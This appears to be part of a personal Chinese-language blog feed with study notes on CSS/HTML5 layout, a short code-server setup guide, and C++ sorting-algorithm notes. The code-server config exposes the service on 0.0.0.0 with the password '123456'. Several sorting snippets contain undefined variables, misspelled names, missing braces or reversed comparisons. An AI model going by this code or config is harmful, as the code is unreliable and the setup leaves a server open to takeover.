title="翻页模块"></a>翻页模块</h3><p>父级元素加text-align:center，子元素的行内元素和行内块元素水平居中</p><h2 id="CSS初始化"><a href="#CSS初始化" class="headerlink" title="CSS初始化"></a>CSS初始化</h2><p>不同浏览器标签的默认值是不同的，兼容性，需要初始化CSS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">    margin:0;</span><br><span class="line">    padding:0</span><br><span class="line">&#125;</span><br><span class="line">em,i&#123;</span><br><span class="line">    font-style:normal</span><br><span class="line">&#125;</span><br><span class="line">li&#123;</span><br><span class="line">    list-style:none</span><br><span class="line">&#125;</span><br><span class="line">img&#123;</span><br><span class="line">border:0;</span><br><span class="line">vertical-align:middle</span><br><span class="line">&#125;</span><br><span class="line">button&#123;</span><br><span class="line">cursor:pointer</span><br><span class="line">&#125;</span><br><span class="line">a&#123;</span><br><span class="line">color:#666;</span><br><span class="line">text-decoration:none</span><br><span class="line">&#125;</span><br><span class="line">a:hover&#123;</span><br><span class="line">color:#c81623</span><br><span class="line">&#125;</span><br><span class="line">button,input&#123;</span><br><span class="line">font-family:Microsoft YaHei,Heiti SC,tahoma,arial,Hiragino Sans GB,&quot;\5B8B\4F53&quot;,sans-serif</span><br><span class="line">&#125;</span><br><span class="line">body&#123;</span><br><span class="line">    -webkit-font-smoothing:antialiased;</span><br><span class="line">    background-color:#fff;</span><br><span class="line">    font:12px/1.5 Microsoft YaHei,Heiti SC,tahoma,arial,Hiragino Sans GB,&quot;\5B8B\4F53&quot;,sans-serif;color:#666</span><br><span class="line">&#125;</span><br><span class="line">.hide,.none&#123;</span><br><span class="line">display:none</span><br><span class="line">&#125;</span><br><span class="line">.clearfix:after&#123;</span><br><span class="line">visibility:hidden;</span><br><span class="line">clear:both;</span><br><span class="line">display:block;</span><br><span class="line">content:&quot;.&quot;;</span><br><span class="line">height:0</span><br><span class="line">&#125;</span><br><span class="line">.clearfix&#123;</span><br><span class="line">*zoom:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HTML5新增"><a href="#HTML5新增" class="headerlink" title="HTML5新增"></a>HTML5新增</h2><h3 id="HTML新增语义化标签"><a href="#HTML新增语义化标签" class="headerlink" title="HTML新增语义化标签"></a>HTML新增语义化标签</h3><p>header、nav、article、section、aside、footer</p><p><img src="http://www.divcss5.com/uploads/allimg/200722/115I61X8-0.jpg" alt="还只会用div布局吗？快来学习下使用HTML5新语义化标签吧"></p><p>使用和div没有区别</p><h3 id="HTML5新增的多媒体标签"><a href="#HTML5新增的多媒体标签" class="headerlink" title="HTML5新增的多媒体标签"></a>HTML5新增的多媒体标签</h3><p>audio</p><p>video</p><p>input email url date search color number tel </p><p>required=”required”强制要求输入文字</p><p>placeholder提示文本</p><p>input::placeholder{</p><p>​    color:pink;</p><p>}</p><p>autofocus:自动聚焦</p><p>autocomplete:input要有名字</p><p>multiple:多选文件提交</p><h2 id="CSS3选增"><a href="#CSS3选增" class="headerlink" title="CSS3选增"></a>CSS3选增</h2><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><p>1.属性选择器</p><p>E[att]</p><p><strong>E[att=”a”]</strong></p><p>E[att^=”a”]以a开头的E元素</p><p>E[att$=”a”]以a结尾的E元素</p><p>E[att*=”val”]具有att属性且包含val的E元素</p><p>属性选择器、类选择器、伪类选择器权重为10</p><p>标签是input并且包含value属性的</p><p>2.结构伪类选择器</p><p>E:nth-child(2)</p><p>n可以是数字、关键字(even odd)、公式(从0开始)</p><p>2n:偶数</p><p>2n+1:奇数</p><p>n+5:从第五个开始</p><p>-n+5:前5个</p><p>E:first-of-type</p><p>E:last-of-type</p><p>E:nth-of-type(n0)</p><p>E:first-child  last-child</p><p>section div:nth-child(1)</p><p>nth-child所有盒子都排列,先找第n个孩子，再看是否匹配</p><p>先看第一个孩子，再选择div</p><p>nth-of-type将指定的type排列</p><p>3.伪元素选择器</p><p>伪元素选择器可以帮助我们利用CSS创建新标签元素，而并不需要HTML标签，从而简化HTML结构</p><p>::before 在元素内部的前面插入内容</p><p>::after 在元素内部的后面插入内容</p><p>before和after会新建一个元素，但是在文档中找不到</p><p>element::before</p><p><strong>before和before必须有content属性</strong></p><p>伪元素选择器权重为1</p><h2 id="CSS3盒子模型"><a href="#CSS3盒子模型" class="headerlink" title="CSS3盒子模型"></a>CSS3盒子模型</h2><p>box-sizing:content-box、border-box</p><p>content-box：盒子大小为width+padding+border(以前默认的)</p><p>border-box：盒子大小为width</p><h2 id="CSS3滤镜filter"><a href="#CSS3滤镜filter" class="headerlink" title="CSS3滤镜filter"></a>CSS3滤镜filter</h2><p>filter:blur(5px)模糊处理</p><p>width:calc(100%-80px)</p><h2 id="CSS3过渡"><a href="#CSS3过渡" class="headerlink" title="CSS3过渡"></a>CSS3过渡</h2><p>一个状态渐渐过渡到另一个状态</p><p>transition: 过渡属性(all) 花费时间(s) 运动曲线 何时开始</p><p>运动曲线:ease linear ease-in ease-out ease-in-out</p><p>何时开始:延迟触发时间，默认是0s(可以省略)</p><p>广义HTML5:html5+css3+javascript</p><h2 id="网站制作流程"><a href="#网站制作流程" class="headerlink" title="网站制作流程"></a>网站制作流程</h2><p>客户沟通制定方案-&gt;签订合同-&gt;预付定金-&gt;初稿审核-&gt;前台页面设计、后台功能开发-&gt;测试验收-&gt;上线培训-&gt;后期维护</p><p>SEO优化</p><p>search engine optimization</p><p>搜索引擎优化，对网站深度优化，帮助免费的流量，提高网站的知名度</p><p>title description keywords三个标签必须满足SEO优化</p><p>title不可替代，搜索引擎了解网页入口</p><p>建议:网站名-网站介绍</p><p>description</p><p>keywords:6-8个</p><p>logo里面放一个h1,h1再放一个链接，链接放文字，链接放title</p><h2 id="tranform"><a href="#tranform" class="headerlink" title="tranform"></a>tranform</h2><p>transform:translate(x,y)  translate不会影响其他盒子</p><p>transform:rotate(45deg)</p><p>旋转中心锚点选择</p><p>transform-origin: x y; top bottom left right可以跟方位名词</p><p>transform:scale(x,y) scale不会影响其他盒子</p><p>2D转化综合写法：</p><p>transform:translate() rotate() scale() 有顺序问题，<strong>位移记得一定放在前面</strong></p><h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><p>1.先定义动画</p><p>2.在使用动画</p><p>from to 等价于0-100%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        @keyframes move &#123;</span><br><span class="line">            0% &#123;</span><br><span class="line">                transform: translateX(0px);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            100% &#123;</span><br><span class="line">                transform: translateX(1000px);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        div &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">            animation-name: move;</span><br><span class="line">            animation-duration: 2s;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>动画常见属性</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/css%E5%8A%A8%E7%94%BB%E5%B1%9E%E6%80%A7.png"></p><p>transform:translateX(100px)</p><p>transform:tranlate3d(x,y,z)</p><h2 id="透视图"><a href="#透视图" class="headerlink" title="透视图"></a>透视图</h2><p>透视perspective加在父元素上</p><h1 id="移动web"><a href="#移动web" class="headerlink" title="移动web"></a>移动web</h1><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="理想视图"><a href="#理想视图" class="headerlink" title="理想视图"></a>理想视图</h3><p>布局视口、视觉适口、理想视口</p><p>手动添加meta视图标签通知浏览器</p><p>meta</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/meta%E8%A7%86%E5%8F%A3.png"></p><h3 id="二倍图"><a href="#二倍图" class="headerlink" title="二倍图"></a>二倍图</h3><p>采用倍图解决放大模糊的问题，50x50(css)放到iphone8里面就会放大两倍，100x100</p><p>采用放一个100x100图片，手动将图片缩写为50x50</p><p>准备的图片比实际需要的大2倍，这就是两倍图</p><h3 id="background-size"><a href="#background-size" class="headerlink" title="background-size:"></a>background-size:</h3><p>cover:完全覆盖，可能有部分背景图片显示不全</p><p>contain:高度和宽度等比例拉伸，当高度或者宽度铺满就不在拉伸</p><h1 id="移动端开发主流方案"><a href="#移动端开发主流方案" class="headerlink" title="移动端开发主流方案"></a>移动端开发主流方案</h1><p>单独制作移动端</p><p>​    流式布局(百分之百布局)</p><p>​    flex弹性布局(强烈推荐)</p><p>​    less+rem+媒体查询布局</p><p>​    混合布局</p><p>响应式移动端</p><p>​    媒体查询</p><p>​    bootstrap</p><p>移动端使用normalize.css</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/css3%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B.png" alt="image-20211105123330528"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051252282.png" alt="image-20211105125247950"></p><h2 id="flex布局"><a href="#flex布局" class="headerlink" title="flex布局"></a>flex布局</h2><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051425533.png" alt="image-20211105142509018"></p><p>PC端布局使用传统布局</p><p>移动端或者不考虑兼容性问题的PC端页面布局，使用flex弹性布局</p><p>不需要使用浮动就可以让行内元素有大小</p><p>默认布局</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051436165.png" alt="img"></p><p>在此基础之上，如果我给父容器仅仅加一个 <code>display: flex</code>属性，此时，这些子元素的布局会摇身一变：</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051436667.png" alt="img"></p><p>在父元素内加：display:flex</p><p>flex：flexible box，弹性布局，用来为盒装模型提供最大的灵活性，任何一个容器都可以指定为flex布局</p><p>父盒子指定flex布局，子元素的float、clear、vertical-align属性失效</p><p>伸缩布局=弹性布局=伸缩盒布局=弹性盒布局=flex布局</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051443736.png" alt="image-20211105144313554"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051446622.png" alt="image-20211105144611507"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051504920.png" alt="image-20211105150419234"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051532065.png" alt="image-20211105153203805"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051537528.png" alt="image-20211105153729574"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051538654.png" alt="img"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051539456.png" alt="image-20211105153952431"></p><p>flex属性用于定义子项目分配剩余空间，用flex来表示占多少份数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">flex:1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也叫做圣杯布局(左右固定，中间占满)</p><ul><li>header和footer设置样式，横向撑满。</li><li>container中的left、center、right依次排布即可</li><li>给container设置弹性布局 <code>display: flex;</code></li><li>left和right区域定宽，center设置 <code>flex: 1;</code> 即可</li></ul><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051552138.png" alt="img"></p><h2 id="rem布局模式"><a href="#rem布局模式" class="headerlink" title="rem布局模式"></a>rem布局模式</h2><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051620219.png" alt="image-20211105162039040"></p><p>rem(root em)是一个相对单位，类似于em，em是父元素字体的大小</p><p>rem的基准是相对于html元素的字体大小</p><p>例如，根元素(html)设置font-size=12px，非根元素设置width:2rem，则转换为px表示就是24px</p><p>em是父元素字体的大小</p><p>rem是控制字体的大小</p><h2 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h2><p>media query</p><p><strong>针对不同的屏幕尺寸设置不同的样式</strong></p><p>小于等于800px变颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@media screen and (max-width:800px) &#123;</span><br><span class="line">       body &#123;</span><br><span class="line">           background-color: purple;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>1.mediatype:</p><p>​    all、print、screen</p><p>2.关键字</p><p>​    and not only</p><p>3.媒体特性</p><p>​    width max-width min-width</p><h2 id="引入资源"><a href="#引入资源" class="headerlink" title="引入资源"></a>引入资源</h2><p>媒体查询对不同的媒体使用不同的css文件，直接在link中判断媒体尺寸，再进行引入css文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;a.css&quot; media=&quot;screen and (min-width:320px)&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="less"><a href="#less" class="headerlink" title="less"></a>less</h1><p>leaner style sheets 是一门CSS扩展语言，也成为css预处理器，引入了变量，Mixin(混入)，运算和函数</p><p>常见的CSS预处理器：Sass、Less、Stylus</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>@变量:变量值;</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051908211.png" alt="image-20211105190838774"></p><p>less支持+ - * /</p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051918098.png" alt="image-20211105191810030"></p><p><img src="https://gitee.com/bluebanister/image/raw/master/img/202111051920768.png" alt="image-20211105192035262"></p><h1 id="响应式开发"><a href="#响应式开发" class="headerlink" title="响应式开发"></a>响应式开发</h1><p>通过媒体查询针对不同宽度设备进行布局和样式设置，适配不同设备的目的</p><p>响应式需要一个父级做布局容器，来配合自己元素来实现变化效果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSS&quot;&gt;&lt;a href=&quot;#CSS&quot; class=&quot;headerlink&quot; title=&quot;CSS&quot;&gt;&lt;/a&gt;CSS&lt;/h1&gt;&lt;h2 id=&quot;实现垂直居中&quot;&gt;&lt;a href=&quot;#实现垂直居中&quot; class=&quot;headerlink&quot; title=&quot;实现垂直居中&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>配置code-server</title>
    <link href="https://zengxiang21.github.io/2021/11/16/%E9%85%8D%E7%BD%AEcode-server/"/>
    <id>https://zengxiang21.github.io/2021/11/16/%E9%85%8D%E7%BD%AEcode-server/</id>
    <published>2021-11-16T08:25:13.869Z</published>
    <updated>2021-10-31T10:36:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>1.code-server项目仓库地址：<br><a href="https://github.com/cdr/code-server">https://github.com/cdr/code-server</a></p><p>2.宝塔面板安装教程：<br><a href="https://www.bt.cn/bbs/thread-19376-1-1.html">https://www.bt.cn/bbs/thread-19376-1-1.html</a></p><p>3.将code-server安装包放在一个空目录中，例如opt</p><p>4.打开/root/.config/code-server 下的config.yaml改密码和端口号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bind-addr: 0.0.0.0:8848</span><br><span class="line">auth: password</span><br><span class="line">password: 123456</span><br><span class="line">cert: false</span><br></pre></td></tr></table></figure><p>5.xshell连接服务器</p><p>​    安装yum install screen</p><p>​    screen -S codeserver</p><p>6.运行./bin/code-server</p><p>7.关闭xshell</p><p>sudo yum install screen</p><p>新建一个叫codeserver会话的命令：<br>screen -S codeserver</p><p>列出当前有多少个screen会话的命令：<br>screen -ls</p><p>运行code-server的命令：<br>./bin/code-server</p><p>关闭指定会话的命令：<br>screen -X -S 会话的进程号 quit</p><p>修改root/config/code-server 改密码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.code-server项目仓库地址：&lt;br&gt;&lt;a href=&quot;https://github.com/cdr/code-server&quot;&gt;https://github.com/cdr/code-server&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.宝塔面板安装教程：&lt;br&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常考算法</title>
    <link href="https://zengxiang21.github.io/2021/11/16/%E5%B8%B8%E8%80%83%E7%AE%97%E6%B3%95/"/>
    <id>https://zengxiang21.github.io/2021/11/16/%E5%B8%B8%E8%80%83%E7%AE%97%E6%B3%95/</id>
    <published>2021-11-16T08:25:13.867Z</published>
    <updated>2022-03-21T04:58:03.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-排序算法"><a href="#1-排序算法" class="headerlink" title="1.排序算法"></a>1.排序算法</h1><p><img src="https://images2017.cnblogs.com/blog/1282720/201711/1282720-20171120155153899-888274770.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在排序元素基本有序的前提下</span><br><span class="line">插入排序效率最高，退化为O(n)</span><br><span class="line">插入排序最坏情况下比较n(n-1)/2次，最好情况下比较n次</span><br><span class="line">快速排序在基本有序的情况下退化为O(n^2)</span><br></pre></td></tr></table></figure><h2 id="稳定的排序"><a href="#稳定的排序" class="headerlink" title="稳定的排序"></a>稳定的排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">冒泡、插入、归并</span><br><span class="line">贵插茂</span><br></pre></td></tr></table></figure><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[i,nums.size()-1]为排好序的</span><br><span class="line">void bubblesort(vector&lt;int&gt;&amp; tem)</span><br><span class="line">&#123;</span><br><span class="line">int size=tem.size();</span><br><span class="line">bool flag=false;</span><br><span class="line">for(int i=size-1;i&gt;0;i--)</span><br><span class="line">&#123;</span><br><span class="line">for(int j=0;j&lt;i;j++)</span><br><span class="line">&#123;</span><br><span class="line">if(tem[j]&gt;tem[j+1])</span><br><span class="line">&#123;</span><br><span class="line">swap(tem[j],tem[j+1]);</span><br><span class="line">                flag=true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if(!flag)</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">思路：[0,i]为整个序列最小排好序的，最大值为tem[i],[i+1,n-1]之间选取一个最小的与tem[i]交换</span><br><span class="line">不稳定</span><br><span class="line"></span><br><span class="line">[0,i]之间是排好序的</span><br><span class="line">void selectsort(vector&lt;int&gt;&amp; tem)</span><br><span class="line">&#123;</span><br><span class="line">for(int i=0;i&lt;tem.size();i++)</span><br><span class="line">&#123;</span><br><span class="line">int minindex=i;</span><br><span class="line">for(int j=i+1;j&lt;tem.size();j++)</span><br><span class="line">&#123;</span><br><span class="line">if(tem[minindex]&gt;tem[j])</span><br><span class="line">minindex=j;</span><br><span class="line">&#125;</span><br><span class="line">swap(tem[i],tem[minindex]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">思路：[0,i-1]为排好序的，i为当前判断的元素，找[0,i-1]之间第一个小于nums[i]的元素，并且往后推，最后j为i一个小于nums[i]的位置，将nums[j+1]=nums[i],最后[i,n-1]从左到右选择一个元素插入[0,i]使其仍然有序</span><br><span class="line">稳定</span><br><span class="line">[0,i-1][,end]</span><br><span class="line"></span><br><span class="line">找哨兵往后推的写法（记这个）</span><br><span class="line">void bubblesort(vector&lt;int&gt;&amp; tem)</span><br><span class="line">&#123;</span><br><span class="line">for(int i=1;i&lt;tem.size();i++)</span><br><span class="line">&#123;</span><br><span class="line">int key=a[i];</span><br><span class="line">int j=i-1;</span><br><span class="line">while(j&gt;=0&amp;&amp;tem[j]&gt;key)</span><br><span class="line">&#123;</span><br><span class="line">tem[j+1]=tem[j];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">tem[j+1]=key;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for循环写法</span><br><span class="line">void bubblesort(vector&lt;int&gt;&amp; tem)</span><br><span class="line">&#123;</span><br><span class="line">for(int i=0;i&lt;tem.size();i++)</span><br><span class="line">&#123;</span><br><span class="line">for(int j=i+1;j&gt;0&amp;&amp;tem[j]&lt;tem[j-1];j--)</span><br><span class="line">&#123;</span><br><span class="line">swap(tem[j],tem[j-1]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while循环写法</span><br><span class="line">void bubblesort(vector&lt;int&gt;&amp; tem)</span><br><span class="line">&#123;</span><br><span class="line">for(int i=0;i&lt;tem.size();i++)</span><br><span class="line">&#123;</span><br><span class="line">int j=i+1;</span><br><span class="line">while(j&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">if(tem[j]&lt;tem[j-1])</span><br><span class="line">&#123;</span><br><span class="line">swap(tem[j],tem[j-1]);</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">法1：</span><br><span class="line">void shellSortCore(vector&lt;int&gt;&amp; nums, int gap, int i) </span><br><span class="line">&#123;</span><br><span class="line">    int inserted = nums[i];</span><br><span class="line">    int j;</span><br><span class="line">    // 插入的时候按组进行插入</span><br><span class="line">    for (j = i - gap; j &gt;= 0 &amp;&amp; inserted &lt; nums[j]; j -= gap) </span><br><span class="line">    &#123;</span><br><span class="line">   nums[j + gap] = nums[j];</span><br><span class="line">    &#125;</span><br><span class="line">    nums[j + gap] = inserted;</span><br><span class="line">&#125;</span><br><span class="line">void shellSort(vector&lt;int&gt;&amp; nums) </span><br><span class="line">&#123;</span><br><span class="line">    int len = nums.size();</span><br><span class="line">    //进行分组，最开始的时候，gap为数组长度一半</span><br><span class="line">    for (int gap = len / 2; gap &gt; 0; gap /= 2)</span><br><span class="line">    &#123;</span><br><span class="line">    //对各个分组进行插入分组</span><br><span class="line">        for (int i = gap; i &lt; len; ++i) </span><br><span class="line">        &#123;</span><br><span class="line">            //将nums[i]插入到所在分组正确的位置上</span><br><span class="line">            shellSortCore(nums,gap,i);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">法2：</span><br><span class="line">void shell_sort(vector&lt;int&gt;&amp; arr)&#123;</span><br><span class="line">    int desquence=1;</span><br><span class="line">    while(dequence&lt;n)&#123;</span><br><span class="line">        dequence=3*desquence+1;</span><br><span class="line">    &#125;</span><br><span class="line">    for(;dequence&gt;0;dequence/=3)&#123;</span><br><span class="line">        for(int i=desquence;i&lt;n;i++)&#123;</span><br><span class="line">            for(int j=i;j&gt;=desquence;j-=desquence)&#123;</span><br><span class="line">                if(arr[j]&gt;arr[j-desquence])&#123;</span><br><span class="line">                    swap(arr[j],arr[j-desquence]);</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">后移sequence再往后一个个比较</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><img 